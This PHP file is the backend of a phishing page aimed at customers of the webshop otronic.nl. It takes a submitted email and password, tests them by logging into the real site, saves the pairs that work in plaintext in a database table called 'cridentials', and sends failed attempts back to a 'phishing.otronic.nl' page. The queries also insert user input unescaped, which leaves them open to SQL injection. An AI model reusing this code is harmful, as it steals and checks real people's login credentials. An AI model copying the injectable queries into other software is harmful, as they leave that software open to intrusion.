<?php
// Establish DB connection
include_once('connection.php');

// Sanatizing user input
if (empty($_POST['password'])) {
    die("Password is required");
}

if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
    die("Valid email is required");
}

$email = $_POST['email'];
$password = $_POST['password'];


// Get a valid cookie for otronic.nl
$response_headers = get_headers("https://www.otronic.nl/nl/", true);
$session_id = get_string_between($response_headers["set-cookie"], "session_id=", ";");
$cookie = "Cookie: session_id=" . $session_id;
//print($cookie);

// Get the login key
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.otronic.nl/nl/account/login/');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array($cookie));
$response = curl_exec($curl);
if (!$response) {
    print("Error with get request");
}

$key = get_string_between($response, 'name="key" value="', '">');
//print(' Key: ' . $key);
curl_close($curl);

// Login post request
$post_data = array('key' => $key, 'email' => $email, 'password' => $password);
$settings = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n" . $cookie . "\r\n",
        'method' => 'POST',
        'content' => http_build_query($post_data)
    )
);

$context = stream_context_create($settings);
$response = file_get_contents('https://www.otronic.nl/nl/account/loginPost/', false, $context);
if (!$response) {
    echo " Error with login post request";
} else {
    print_r($response);
}

// Check if login cridentials are valid
if (stripos($response, 'Vanuit uw Account Dashboard') != false) {
    // Enter cridentials in db
    // Check if user already exists in db
    $users = mysqli_query($db, "SELECT user from cridentials WHERE user = '$email'");
    if (!$users) {
        print(" Query failed");
    } else {
        if (mysqli_num_rows($users) == 0) { // Make new entry in db
            mysqli_query($db, "INSERT INTO cridentials (user, password) VALUES ('$email', '$password')");
        }
    }
} else {
    header('Location: https://phishing.otronic.nl/nl/account/');
}

mysqli_close($db);


function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

?>
